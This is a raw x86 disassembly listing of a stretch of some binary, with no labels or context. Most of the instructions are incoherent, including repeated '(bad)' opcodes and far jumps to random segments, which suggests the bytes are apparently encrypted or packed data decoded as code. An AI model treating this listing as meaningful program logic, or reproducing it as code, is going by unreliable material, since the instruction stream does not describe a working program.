  408961:	pop    es
  408962:	mov    ch,0x16
  408964:	fnsave [ecx-0x71]
  408967:	cli    
  408968:	ins    BYTE PTR es:[edi],dx
  408969:	addr16 push edx
  40896b:	add    eax,0x98d162ac
  408970:	iret   
  408971:	aam    0xeb
  408973:	test   al,0xcc
  408975:	sbb    al,0x90
  408977:	dec    edx
  408978:	retf   0x84c7
  40897b:	ins    BYTE PTR es:[edi],dx
  40897c:	xor    DWORD PTR [ecx],0xffffffbf
  40897f:	test   eax,0xf5b6a194
  408984:	xchg   esi,eax
  408985:	aaa    
  408986:	xor    al,0x7c
  408988:	xchg   edx,eax
  408989:	out    dx,eax
  40898a:	es mov ebp,0xf30cdd68
  408990:	jno    0x4089eb
  408992:	cmp    BYTE PTR [esi-0x34],0xae
  408996:	add    ebp,ebp
  408998:	sbb    BYTE PTR [edx-0xd4229a3],0x39
  40899f:	jecxz  0x4089d1
  4089a1:	jecxz  0x40892f
  4089a3:	rcl    BYTE PTR [edi-0x25],0x61
  4089a7:	xchg   DWORD PTR [esi-0x4b],eax
  4089aa:	xchg   edx,eax
  4089ab:	sti    
  4089ac:	mov    cl,0x16
  4089ae:	xchg   edx,eax
  4089af:	jno    0x4089f3
  4089b1:	lds    ebx,FWORD PTR ds:0x2fd00e63
  4089b7:	cdq    
  4089b8:	pop    esi
  4089b9:	cmc    
  4089ba:	jnp    0x4089a6
  4089bc:	sub    BYTE PTR [ecx-0x2df403b3],dh
  4089c2:	inc    ebx
  4089c3:	or     esi,DWORD PTR [edx+0x70]
  4089c6:	add    BYTE PTR [eax-0x528913a3],bh
  4089cc:	mov    ebx,0xe726fb66
  4089d1:	xchg   esi,eax
  4089d2:	pop    edi
  4089d3:	push   0xffffff8f
  4089d5:	pusha  
  4089d6:	retf   
  4089d7:	into   
  4089d8:	adc    eax,0x704bd2d7
  4089dd:	adc    cl,dl
  4089df:	adc    al,0xc7
  4089e1:	sbb    al,0xcb
  4089e3:	repnz (bad) 
  4089e5:	aam    0xe1
  4089e7:	jae    0x4089ca
  4089e9:	and    BYTE PTR [ebp-0x39],bl
  4089ec:	jp     0x4089ae
  4089ee:	xchg   edi,eax
  4089ef:	push   esp
  4089f0:	dec    ecx
  4089f1:	jl     0x4089e2
  4089f3:	scas   eax,DWORD PTR es:[edi]
  4089f4:	ins    BYTE PTR es:[edi],dx
  4089f5:	ins    DWORD PTR es:[edi],dx
  4089f6:	jo     0x408a22
  4089f8:	stos   BYTE PTR es:[edi],al
  4089f9:	pop    ebx
  4089fa:	jbe    0x4089fb
  4089fc:	dec    ebx
  4089fd:	bound  ecx,QWORD PTR [ebp-0x38]
  408a00:	(bad)  
  408a01:	jo     0x4089fa
  408a03:	sar    BYTE PTR [ebx+0x5a5b4ac3],cl
  408a09:	test   BYTE PTR [ebx],dl
  408a0b:	inc    esi
  408a0c:	dec    eax
  408a0d:	nop    DWORD PTR [eax]
  408a10:	xchg   ebp,eax
  408a11:	mov    ebx,0xe9649d00
  408a16:	adc    esp,DWORD PTR [ecx]
  408a18:	(bad)  [ecx+edi*2+0x25818ea9]
  408a1f:	aam    0xb9
  408a21:	je     0x4089b6
  408a23:	dec    esi
  408a24:	adc    BYTE PTR [edx],ch
  408a26:	fs call 0x93f9d844
  408a2c:	sub    DWORD PTR [ecx-0x7e45cb32],edx
  408a32:	push   0xb753158f
  408a37:	or     BYTE PTR [ebp+eax*8+0x2b],cl
  408a3b:	and    dh,ah
  408a3d:	lods   eax,DWORD PTR ds:[esi]
  408a3e:	ss mov ah,0x48
  408a41:	in     eax,0xa1
  408a43:	enter  0x6f67,0xe4
  408a47:	sub    al,0x8d
  408a49:	xchg   DWORD PTR [edx-0x2f],ebp
  408a4c:	ins    BYTE PTR es:[edi],dx
  408a4d:	call   0x6cbf:0x3488a24a
  408a54:	cmc    
  408a55:	pop    ecx
  408a56:	jl     0x4089ee
  408a58:	inc    esi
  408a59:	fild   WORD PTR [edi+0x1577454f]
  408a5f:	pop    esp
  408a60:	imul   ecx,DWORD PTR [edi-0x48],0xffffffd1
  408a64:	arpl   WORD PTR [edx-0xe],sp
  408a67:	sbb    al,0x37
  408a69:	jge    0x408a18
  408a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a6c:	xchg   esp,eax
  408a6d:	xchg   esi,eax
  408a6e:	nop
  408a6f:	push   cs
  408a70:	mov    ?,WORD PTR [ebx+ecx*4+0x590e1c5d]
  408a77:	jns    0x408a67
  408a79:	or     al,0x41
  408a7b:	or     DWORD PTR [eax],ebx
  408a7d:	sbb    ah,BYTE PTR [ecx-0x8]
  408a80:	jmp    0x2266:0x1a2ae1c1
  408a87:	jp     0x408a42
  408a89:	push   cs
  408a8a:	retf   0xebd8
  408a8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a8e:	pop    ds
  408a8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a90:	push   ebp
  408a91:	mov    BYTE PTR [ebx],dh
  408a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a95:	and    ah,BYTE PTR [ebp+0x6a019e19]
  408a9b:	xchg   esp,eax
  408a9c:	push   edx
  408a9d:	dec    esp
  408a9e:	outs   dx,BYTE PTR ds:[esi]
  408a9f:	(bad)
  408aa3:	scas   al,BYTE PTR es:[edi]
  408aa4:	pop    ecx
  408aa5:	int3   
  408aa6:	cs in  eax,dx
  408aa8:	ins    DWORD PTR es:[edi],dx
  408aa9:	(bad)  
  408aab:	sbb    DWORD PTR es:[ebx-0x3ff67cf0],eax
  408ab2:	jmp    0x408b24
  408ab4:	jne    0x408abd
  408ab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ab7:	cli    
  408ab8:	add    eax,0x60e11b9d
  408abd:	mov    esp,0x5830bdfa
  408ac2:	imul   esi,DWORD PTR [ebp+0x38],0xffffff83
  408ac6:	int3   
  408ac7:	xor    DWORD PTR [ebx-0x30],esi
  408aca:	mov    eax,ds:0x7d8fd7f9
  408acf:	push   es
  408ad0:	(bad)  
  408ad1:	std    
  408ad2:	pop    ss
  408ad3:	sub    esp,DWORD PTR [edx*1-0x724feb33]
  408ada:	push   0x10
  408adc:	jb     0x408abc
  408ade:	mov    edi,ebx
  408ae0:	xor    DWORD PTR [ebx+0x74],ecx
  408ae3:	add    bl,BYTE PTR [ebp-0x1c7ecea8]
  408ae9:	dec    edi
  408aea:	jno    0x408b09
  408aec:	sahf   
  408aed:	adc    BYTE PTR [ecx+0x7643bf86],0x1b
  408af4:	xor    BYTE PTR [ebx-0x45cc61c5],ah
  408afa:	test   BYTE PTR [ecx+0x4103c68e],dh
  408b00:	test   DWORD PTR [edx-0x3c],esi
  408b03:	inc    ebp
  408b04:	xchg   BYTE PTR es:[eax+0x1a0a0748],al
  408b0b:	cmc    
  408b0c:	stc    
  408b0d:	data16 aam 0x72
  408b10:	push   edx
  408b11:	scas   al,BYTE PTR es:[edi]
  408b12:	inc    ebp
  408b13:	dec    eax
  408b14:	ins    BYTE PTR es:[edi],dx
  408b15:	enter  0xffdf,0x94
  408b19:	push   ebp
  408b1a:	mov    edi,eax
  408b1c:	stc    
  408b1d:	out    dx,eax
  408b1e:	sub    dh,al
  408b20:	mov    al,0x74
  408b22:	push   0xbe64a0e1
  408b27:	stos   BYTE PTR es:[edi],al
  408b28:	mov    ds:0xfe79f437,al
  408b2d:	popa   
  408b2e:	mov    eax,ds:0x1b1ff892
  408b33:	push   edx
  408b34:	add    cl,BYTE PTR [edx-0x6c]
  408b37:	push   DWORD PTR ds:0xe46cdba3
  408b3d:	iret   
  408b3e:	sbb    ecx,esp
  408b40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b41:	cs popf 
  408b43:	push   edi
  408b44:	cld    
  408b45:	int3   
  408b46:	sub    cl,al
  408b48:	ret    
  408b49:	pop    esi
  408b4a:	ja     0x408b7b
  408b4c:	(bad)  
  408b4d:	outs   dx,DWORD PTR ds:[esi]
  408b4e:	add    DWORD PTR cs:[esi-0x2e20c542],esp
  408b55:	push   ss
  408b56:	push   ebx
  408b57:	sbb    edi,esp
  408b59:	out    dx,al
  408b5a:	addr16 adc eax,0xdd0b24cb
  408b60:	lock mov ebx,0x955dcb99
  408b66:	daa    
  408b67:	xor    eax,0x2e37ecd5
  408b6c:	jle    0x408b87
  408b6e:	cmc    
  408b6f:	xor    BYTE PTR [eax+0x7c8c86ff],dl
  408b75:	clc    
  408b76:	dec    ecx
  408b77:	push   es
  408b78:	loope  0x408bcd
  408b7a:	data16 (bad) 
  408b7c:	fcom   QWORD PTR [eax-0x71]
  408b7f:	std    
  408b80:	xchg   edx,eax
  408b81:	dec    ebx
  408b82:	adc    eax,0x6b44f4da
  408b87:	pop    es
  408b88:	push   edi
  408b89:	outs   dx,BYTE PTR ds:[esi]
  408b8a:	jl     0x408b38
  408b8c:	sbb    DWORD PTR [edi],0x5e
  408b8f:	fcom   DWORD PTR [ecx-0x1c44e754]
  408b95:	stos   BYTE PTR es:[edi],al
  408b96:	pop    es
  408b97:	sbb    ah,dl
  408b99:	enter  0x759b,0x61
  408b9d:	mov    BYTE PTR [edx-0x7a9e63df],cl
  408ba3:	push   esi
  408ba4:	pop    esi
  408ba5:	shr    BYTE PTR [ebx+0x61d32e54],1
  408bab:	push   edx
  408bac:	loope  0x408b7d
  408bae:	cmp    DWORD PTR [esi],eax
  408bb0:	lds    esp,FWORD PTR [ebx-0x26]
  408bb3:	in     al,dx
  408bb4:	mov    dl,0x20
  408bb6:	and    bh,BYTE PTR [ecx-0x1c]
  408bb9:	mov    ?,eax
  408bbb:	mov    bl,0x7d
  408bbd:	push   es
  408bbe:	mov    WORD PTR [eax-0x7a],cs
  408bc1:	loop   0x408b4c
  408bc3:	push   ss
  408bc4:	lds    esp,FWORD PTR [esi-0x74]
  408bc7:	call   0x9a92:0x8f8e9ad4
  408bce:	mov    dl,0xef
  408bd0:	test   DWORD PTR [edi*2+0xc07432d],ecx
  408bd7:	ffree  st(1)
  408bd9:	imul   edx,DWORD PTR [eax+ecx*8],0xffffffae
  408bdd:	lods   al,BYTE PTR ds:[esi]
  408bde:	add    eax,0x155c68c7
  408be3:	nop
  408be4:	pop    esi
  408be5:	xor    eax,0x98c73eb5
  408bea:	shl    BYTE PTR [edi+eax*1-0x3989b471],0xc2
  408bf2:	sub    BYTE PTR [eax],0xaa
  408bf5:	test   eax,0xff5f1de
  408bfa:	nop
  408bfb:	xor    al,0x1
  408bfd:	out    0xa6,al
  408bff:	imul   ecx,DWORD PTR [ebx+0x4355ce81],0xe
  408c06:	ret    
  408c07:	sub    BYTE PTR [ecx+0x22],al
  408c0a:	ins    DWORD PTR es:[edi],dx
  408c0b:	ss inc edx
  408c0d:	aas    
  408c0e:	add    BYTE PTR [edi],ch
  408c10:	xchg   ebp,eax
  408c11:	nop
  408c12:	pop    edx
  408c13:	(bad)  
  408c14:	add    ebx,DWORD PTR [edi]
  408c16:	lods   eax,DWORD PTR ds:[esi]
  408c17:	pop    edi
  408c18:	out    dx,al
  408c19:	(bad)  [esi]
  408c1b:	int3   
  408c1c:	(bad)  
  408c1d:	dec    ebx
  408c1e:	das    
  408c1f:	jae    0x408bd5
  408c21:	pop    esi
  408c22:	push   ebx
  408c23:	xor    DWORD PTR [edx-0x6a],edx
  408c26:	lahf   
  408c27:	ds jns 0x408c23
  408c2a:	pushf  
  408c2b:	cmc    
  408c2c:	mov    ecx,0x6fd7ad73
  408c31:	mov    ch,0xde
  408c33:	ins    BYTE PTR es:[edi],dx
  408c34:	lods   al,BYTE PTR ds:[esi]
  408c35:	jle    0x408bed
  408c37:	test   al,0x7f
  408c39:	mov    esp,0xcfc8befa
  408c3e:	mov    dh,0x94
  408c40:	or     cl,bl
  408c42:	fsub   st,st(6)
  408c44:	pop    es
  408c45:	test   eax,0x8749592f
  408c4a:	sar    esi,1
  408c4c:	or     bh,bh
  408c4e:	jne    0x408c40
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  esp,QWORD PTR [edx+esi*2-0x26b84a78]
  408c76:	jo     0x408ce8
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c70
  408c7d:	pop    esi
  408c7e:	mov    ecx,ss
  408c80:	outs   dx,DWORD PTR ds:[esi]
  408c81:	adc    eax,0x64a6a6d9
  408c86:	sub    BYTE PTR [ebp-0x6b78f379],cl
  408c8c:	shr    BYTE PTR [esi+esi*2+0x294a3cba],0x50
  408c94:	(bad)  
  408c95:	gs pop edx
  408c97:	pop    ds
  408c98:	sbb    BYTE PTR [eax-0x72],ah
  408c9b:	add    ah,BYTE PTR [edi-0x569da5f2]
  408ca1:	in     al,dx
  408ca2:	in     eax,0x86
  408ca4:	xchg   esi,eax
  408ca5:	inc    ebx
  408ca6:	inc    edx
  408ca7:	test   dl,dh
  408ca9:	fld    TBYTE PTR [edx-0x1d]
  408cac:	jg     0x408cb2
  408cae:	push   ebx
  408caf:	sbb    BYTE PTR [ebx+esi*8],al
  408cb2:	imul   ebx,ecx,0xffffffd7
  408cb5:	loope  0x408cdb
  408cb7:	mov    ebp,ebx
  408cb9:	sti    
  408cba:	pop    ss
  408cbb:	clc    
  408cbc:	jl     0x408c97
  408cbe:	ss test eax,0xb9d2826b
  408cc4:	sbb    DWORD PTR [edi],0x5e8c9516
  408cca:	add    esp,DWORD PTR [edx+eiz*1]
  408ccd:	xchg   ebp,eax
  408cce:	mov    ecx,0xc8f33693
  408cd3:	cmp    eax,0x2685370f
  408cd8:	inc    esp
  408cd9:	xor    eax,0xb9a5126
  408cde:	icebp  
  408cdf:	dec    esi
  408ce0:	fist   DWORD PTR [eax]
  408ce2:	repz inc edx
  408ce4:	fcom   DWORD PTR [ebp-0x49]
  408ce7:	adc    BYTE PTR [eax],dl
  408ce9:	push   edi
  408cea:	or     BYTE PTR [edi+0x607766ec],al
  408cf0:	dec    eax
  408cf1:	in     al,0xf5
  408cf3:	mov    ah,0x85
  408cf5:	jp     0x408c7a
  408cf7:	mov    ds:0xda9bb081,al
  408cfc:	ins    BYTE PTR es:[edi],dx
  408cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cfe:	bound  edi,QWORD PTR ds:0x50b8c38b
  408d04:	mov    ch,0x53
  408d06:	xchg   BYTE PTR [edx-0x567b0ed0],bl
  408d0c:	push   0xf3e93c35
  408d11:	js     0x408cbc
  408d13:	fcomi  st,st(2)
  408d15:	cmp    al,0x5b
  408d17:	lods   eax,DWORD PTR ds:[esi]
  408d18:	add    ch,BYTE PTR [ecx-0x15]
  408d1b:	jno    0x408d6e
  408d1d:	loope  0x408d85
  408d1f:	bnd jno 0x408ce4
  408d22:	cwde   
  408d23:	inc    ebp
  408d24:	adc    al,0x1a
  408d26:	in     al,0x14
  408d28:	fcom   QWORD PTR [edx]
  408d2a:	push   eax
  408d2b:	(bad)  [edi+edx*2]
  408d2e:	push   ds
  408d2f:	push   DWORD PTR [edx-0x77d9639b]
  408d35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d36:	lds    esp,FWORD PTR [ecx-0x1e]
  408d39:	xchg   edi,ecx
  408d3b:	fadd   QWORD PTR ds:0xb4e4eae6
  408d41:	or     DWORD PTR ds:0x49680ed2,eax
  408d47:	adc    BYTE PTR [eax],al
  408d49:	mov    esi,0x848cfb41
  408d4e:	xchg   edx,eax
  408d4f:	add    bh,BYTE PTR [esi+0x729d9b62]
  408d55:	scas   al,BYTE PTR es:[edi]
  408d56:	push   cs
  408d57:	mov    cs,ecx
  408d59:	in     al,dx
  408d5a:	ror    DWORD PTR [eax-0x765135cf],cl
  408d60:	fsub   QWORD PTR [eax+0x6c9d6351]
  408d66:	lods   al,BYTE PTR es:[esi]
  408d68:	pop    esi
  408d69:	mov    ebx,0xb72433c
  408d6e:	mov    ah,bh
  408d70:	or     edx,DWORD PTR [ebp+0x2a824ef1]
  408d76:	cmp    eax,0x2872acc5
  408d7b:	push   ss
  408d7c:	sbb    ebp,DWORD PTR [ecx]
  408d7e:	inc    esp
  408d7f:	fwait
  408d80:	push   ecx
  408d81:	rol    BYTE PTR [ebx],1
  408d83:	xor    bh,BYTE PTR [ecx]
  408d85:	inc    ecx
  408d86:	adc    bl,BYTE PTR [ecx+0x1df7dc17]
  408d8c:	push   ecx
  408d8d:	sub    ah,dh
  408d8f:	inc    edx
  408d90:	(bad)  
  408d91:	shl    bh,1
  408d93:	push   esi
  408d94:	dec    ebp
  408d95:	cmp    ecx,ebx
  408d97:	sbb    bl,dl
  408d99:	or     al,0x21
  408d9b:	mov    al,ds:0x2dba053c
  408da0:	into   
  408da1:	ds add esp,ecx
  408da4:	and    al,0xac
  408da6:	inc    ebp
  408da7:	fs pushf 
  408da9:	fidiv  WORD PTR [edi+0x40cdc123]
  408daf:	icebp  
  408db0:	push   cs
  408db1:	mov    eax,ds:0x183806c4
  408db6:	xor    DWORD PTR [edi],eax
  408db8:	jp     0x408d67
  408dba:	xchg   edi,eax
  408dbb:	pop    es
  408dbc:	test   al,0x69
  408dbe:	pop    eax
  408dbf:	ja     0x408d9b
  408dc1:	cli    
  408dc2:	pushf  
  408dc3:	inc    edx
  408dc4:	dec    ebx
  408dc5:	mov    dl,0xf
  408dc7:	or     dh,BYTE PTR [esi+0x3d851a75]
  408dcd:	ja     0x408d4f
  408dcf:	add    al,0xd6
  408dd1:	cli    
  408dd2:	push   eax
  408dd3:	pop    ds
  408dd4:	cwde   
  408dd5:	dec    esp
  408dd6:	xchg   esi,eax
  408dd7:	fidiv  WORD PTR [eax-0x294cd982]
  408ddd:	mov    dh,0xcc
  408ddf:	adc    al,0xd7
  408de1:	scas   al,BYTE PTR es:[edi]
  408de2:	jg     0x408df0
  408de4:	fs dec ecx
  408de6:	add    BYTE PTR [edx+0x644e937],ah
  408dec:	pop    ebx
  408ded:	mov    dh,0xd1
  408def:	mov    ah,0xcc
  408df1:	mov    al,ds:0x57dbf7a4
  408df6:	jl     0x408db7
  408df8:	jno    0x408dc3
  408dfa:	pop    ecx
  408dfb:	inc    eax
  408dfc:	fild   DWORD PTR [edi]
  408dfe:	sahf   
  408dff:	mov    es:0x8527835d,eax
  408e05:	inc    eax
  408e06:	mov    bl,0x51
  408e08:	int3   
  408e09:	out    0x49,al
  408e0b:	and    eax,0x76549f6f
  408e10:	xlat   BYTE PTR ds:[ebx]
  408e11:	xor    BYTE PTR [edi],0xd3
  408e14:	or     ebp,DWORD PTR [esi]
  408e16:	cmc    
  408e17:	mov    cl,0xb1
  408e19:	in     eax,0x3d
  408e1b:	outs   dx,DWORD PTR ds:[esi]
  408e1c:	push   0xffffffee
  408e1e:	ins    DWORD PTR es:[edi],dx
  408e1f:	dec    esp
  408e20:	loopne 0x408e27
  408e22:	mov    BYTE PTR [edx],ah
  408e24:	nop
  408e25:	xchg   esi,eax
  408e26:	daa    
  408e27:	xor    DWORD PTR [eax-0x2a],0x2d
  408e2b:	leave  
  408e2c:	(bad)  
  408e2d:	sbb    BYTE PTR [ebp-0x44],ah
  408e30:	add    eax,eax
  408e32:	sbb    DWORD PTR [edx],ebx
  408e34:	and    BYTE PTR [esi+0xb],dl
  408e37:	push   esp
  408e38:	and    eax,0x60780e1b
  408e3d:	and    al,0x31
  408e3f:	jmp    0x3275:0xffdd238d
  408e46:	js     0x408e7f
  408e48:	dec    edi
  408e49:	out    0xf0,eax
  408e4b:	(bad)  
  408e4c:	jmp    0x408e26
  408e4e:	cmp    eax,0x44ce1b4e
  408e53:	loop   0x408e2e
  408e55:	imul   edi,DWORD PTR [edx],0x1e
  408e58:	cld    
  408e59:	shl    BYTE PTR [edx],0xc8
  408e5c:	dec    esi
  408e5d:	jecxz  0x408e96
  408e5f:	fisubr WORD PTR [ebx]
  408e61:	popa   
  408e62:	mov    ch,0x4f
  408e64:	cmc    
  408e65:	mov    bh,0x7c
  408e67:	inc    ebx
  408e68:	add    BYTE PTR ds:0x34c11379,bl
  408e6e:	or     eax,0xc363fa33
  408e73:	xchg   ebp,eax
  408e74:	jecxz  0x408e18
  408e76:	cmp    DWORD PTR [esi],eax
  408e78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e79:	xchg   ebx,eax
  408e7a:	stos   DWORD PTR es:[edi],eax
  408e7b:	push   ebp
  408e7c:	and    DWORD PTR [ecx+0x77],esp
  408e7f:	push   ecx
  408e80:	dec    esp
  408e81:	in     al,dx
  408e82:	into   
  408e83:	add    edi,edi
  408e85:	sbb    eax,0xbe871a01
  408e8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e8b:	dec    eax
  408e8c:	cmp    eax,0x261590c1
  408e91:	mov    BYTE PTR [ebx+edi*1+0x43d5ef70],bl
  408e98:	mov    eax,ds:0x7c298220
  408e9d:	mov    esi,0xb230d52d
  408ea2:	xlat   BYTE PTR ds:[ebx]
  408ea3:	into   
  408ea4:	mov    ecx,0x4d712599
  408ea9:	fstp   DWORD PTR [edx+0x3b629353]
  408eaf:	ds ja  0x408e9c
  408eb2:	mov    bl,0xde
  408eb4:	cs js  0x408e86
  408eb7:	inc    esp
  408eb8:	pop    edx
  408eb9:	adc    eax,0x7c990402
  408ebe:	xor    bh,0x22
  408ec1:	cld    
  408ec2:	jno    0x408ee3
  408ec4:	lea    esi,[ebx+0x36]
  408ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ec8:	jmp    0xc45:0x9ae8e407
  408ecf:	jae    0x408f0f
  408ed1:	into   
  408ed2:	xor    ebp,DWORD PTR [ecx-0x37e07fd7]
  408ed8:	sbb    dh,BYTE PTR [edi]
  408eda:	sub    eax,0xbe169676
  408edf:	sbb    edi,ebp
  408ee1:	jmp    0x57c4:0x5a033924
  408ee8:	sbb    BYTE PTR [esi-0x16],bl
  408eeb:	or     eax,0x2caff373
  408ef0:	(bad)  
  408ef1:	in     eax,dx
  408ef2:	jl     0x408ed0
  408ef4:	mov    ds:0xe2a4077b,al
  408ef9:	add    dh,BYTE PTR [edi+0xf33c19d]
  408eff:	lds    ebx,FWORD PTR fs:[eax-0x167eec79]
  408f06:	leave  
  408f07:	xchg   edx,eax
  408f08:	push   ss
  408f09:	and    bh,BYTE PTR [edx]
  408f0b:	popa   
  408f0c:	loope  0x408f4d
  408f0e:	cld    
  408f0f:	or     eax,0xf84c2248
  408f14:	xor    al,0xf7
  408f16:	sar    BYTE PTR [esi-0x56694a41],1
  408f1c:	mov    ds:0x90e4c0f9,eax
  408f21:	and    al,0xe
  408f23:	int3   
  408f24:	mov    WORD PTR [ebx-0x2],es
  408f27:	xor    ebx,edi
  408f29:	mov    bl,BYTE PTR [edx+0xb]
  408f2c:	call   0x636e:0x770614b4
  408f33:	cmc    
  408f34:	hlt    
  408f35:	jg     0x408f8e
  408f37:	and    DWORD PTR [edi-0x5ee55dac],edx
  408f3d:	or     esi,ebx
  408f3f:	cmp    dl,BYTE PTR [esi-0x2f]
  408f42:	imul   esi,DWORD PTR [ecx+ebp*8],0xffffffd5
  408f46:	sub    BYTE PTR [ecx+0x63b99021],ah
  408f4c:	out    0xe6,al
  408f4e:	sbb    ah,0x7d
  408f51:	call   0x9a6e16b1
  408f56:	fwait
  408f57:	sub    DWORD PTR [ebp-0x11],0x3915e557
  408f5e:	pop    ecx
  408f5f:	int    0xbb
  408f61:	push   cs
  408f62:	mov    bh,0x1b
  408f64:	sbb    ebp,DWORD PTR [edi]
  408f66:	xor    DWORD PTR [edi],eax
  408f68:	retf   0x6734
  408f6b:	sbb    ebx,0x6a
  408f6e:	or     cl,ch
  408f70:	sbb    BYTE PTR [ecx-0x2e],al
  408f73:	out    dx,al
  408f74:	pop    eax
  408f75:	loope  0x408ff6
  408f77:	arpl   WORD PTR [ebp+0x1c],dx
  408f7a:	outs   dx,DWORD PTR ds:[esi]
  408f7b:	and    eax,0x3b6402a4
  408f80:	sar    DWORD PTR [edi],cl
  408f82:	(bad)  [esi-0x718b5dde]
  408f88:	xchg   ebx,eax
  408f89:	jecxz  0x408fee
  408f8b:	add    DWORD PTR [ebx-0x1a9b2ad2],ecx
  408f91:	test   DWORD PTR [edi+0x3dcbf72a],edi
  408f97:	adc    ah,cl
  408f99:	ret    0xb28c
  408f9c:	(bad)  
  408f9d:	pop    esi
  408f9e:	mov    BYTE PTR [edx+eax*2+0x25e9c48f],bh
  408fa5:	xor    eax,0x4d046ead
  408faa:	aam    0xff
  408fac:	push   DWORD PTR [eax]
  408fae:	lea    eax,ds:0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0xd01937f3
  408fc6:	sar    BYTE PTR [edi+0x70e6774a],1
  408fcc:	jo     0x408fee
  408fce:	jge    0x409040
  408fd0:	jo     0x408f60
  408fd2:	je     0x40903a
  408fd4:	xor    BYTE PTR [ebx+eax*8-0x67fa7579],dl
  408fdb:	adc    al,0x9
  408fdd:	mov    ch,0x36
  408fdf:	jg     0x409042
  408fe1:	imul   eax,esi,0xffffff8b
  408fe4:	cli    
  408fe5:	sub    DWORD PTR [ebx-0x5516a43b],ecx
  408feb:	add    bl,BYTE PTR ds:0xfad47cce
  408ff1:	lock aaa 
  408ff3:	dec    esp
  408ff4:	mov    al,ds:0x697e2829
  408ff9:	es push 0xc7fd55f
  408fff:	jg     0x408fd1
  409001:	in     eax,dx
  409002:	in     al,dx
  409003:	scas   eax,DWORD PTR es:[edi]
  409004:	lock jl 0x409067
  409007:	pop    ecx
  409008:	jne    0x409052
  40900a:	sub    DWORD PTR [eax-0x78],esp
  40900d:	jne    0x409051
  40900f:	lock outs dx,BYTE PTR ds:[esi]
  409011:	mov    edi,0xf68d9d39
  409016:	push   esp
  409017:	cmp    eax,0x8f6bcf81
  40901c:	sti    
  40901d:	pop    edx
  40901e:	sbb    eax,0x94bf1056
  409023:	mov    cl,0x56
  409025:	xchg   DWORD PTR ds:0x942744b6,esi
  40902b:	xor    BYTE PTR [ebp+edi*8-0x22],0x7b
  409030:	pop    eax
  409031:	(bad)  
  409033:	inc    ebx
  409034:	es aaa 
  409036:	ins    BYTE PTR es:[edi],dx
  409037:	popf   
  409038:	out    dx,al
  409039:	cmp    al,BYTE PTR [edx]
  40903b:	cmp    BYTE PTR [edi+0x79],0x59
  40903f:	and    bl,bl
  409041:	stc    
  409042:	lea    esi,[ebx]
  409044:	inc    edx
  409045:	add    esp,0x75c43ed5
  40904b:	outs   dx,BYTE PTR ds:[esi]
  40904c:	popa   
  40904d:	jnp    0x408fd0
  40904f:	out    0xa1,eax
  409051:	or     dl,BYTE PTR [ecx]
  409053:	rcr    ah,cl
  409055:	and    esp,0xcd9224ba
  40905b:	and    eax,0x2b9cc778
  409060:	ret    0x60f3
  409063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409064:	push   0x71
  409066:	push   ebp
  409067:	fdivp  st(7),st
  409069:	jns    0x4090c4
  40906b:	std    
  40906c:	xor    ebx,DWORD PTR [ebx+0x6dbc42f]
  409072:	imul   esi,DWORD PTR [esi+0x433937e3],0xb4d20fb1
  40907c:	stc    
  40907d:	push   edi
  40907e:	xchg   ebp,eax
  40907f:	sub    edi,DWORD PTR [edi+ebp*4]
  409082:	pop    ebp
  409083:	xor    DWORD PTR [ebx+0x23519c88],0x1e
  40908a:	add    BYTE PTR ds:0x2ce2d1e3,0x26
  409091:	int    0xd7
  409093:	push   ebx
  409094:	outs   dx,BYTE PTR ds:[esi]
  409095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409096:	repz mov ebx,DWORD PTR [eax]
  409099:	mov    al,ds:0x8562da2d
  40909e:	nop
  40909f:	pop    esp
  4090a0:	cs sub cl,cl
  4090a3:	pop    esi
  4090a4:	cli    
  4090a5:	(bad)  
  4090a6:	xchg   esi,eax
  4090a7:	js     0x4090f7
  4090a9:	jnp    0x40902f
  4090ab:	jp     0x409119
  4090ad:	push   cs
  4090ae:	add    DWORD PTR [eax+ecx*1+0x421cc4ae],esp
  4090b5:	mov    eax,0x456bd49f
  4090ba:	nop
  4090bb:	dec    edi
  4090bc:	dec    esi
  4090bd:	inc    eax
  4090be:	loop   0x40905c
  4090c0:	xor    al,0x2
  4090c2:	je     0x40907f
  4090c4:	inc    eax
  4090c5:	nop
  4090c6:	mov    ebx,DWORD PTR [edx+0xd42afcc]
  4090cc:	cs jo  0x4090cd
  4090cf:	popf   
  4090d0:	sub    BYTE PTR [ebp+0x2d],cl
  4090d3:	jmp    0x32d9:0x75487c1e
  4090da:	jnp    0x4090ae
  4090dc:	mov    BYTE PTR [ecx-0x1b67cd7d],0xfa
  4090e3:	adc    BYTE PTR [edi-0x29cc5ee9],0x17
  4090ea:	arpl   WORD PTR [esi+ebp*2-0x29],sp
  4090ee:	mov    eax,0xe14925c
  4090f3:	dec    esi
  4090f4:	ds ja  0x40914d
  4090f7:	out    0x31,eax
  4090f9:	test   BYTE PTR [ecx],0x31
  4090fc:	sbb    BYTE PTR [esi+0x15],bh
  4090ff:	mov    eax,0xcdccdb02
  409104:	jl     0x409114
  409106:	stc    
  409107:	shr    DWORD PTR [edi],0xe3
  40910a:	and    al,0xf9
  40910c:	add    bl,dl
  40910e:	xchg   BYTE PTR [ebx-0x158fa813],dh
  409114:	xor    BYTE PTR [edi-0x2d],al
  409117:	inc    edx
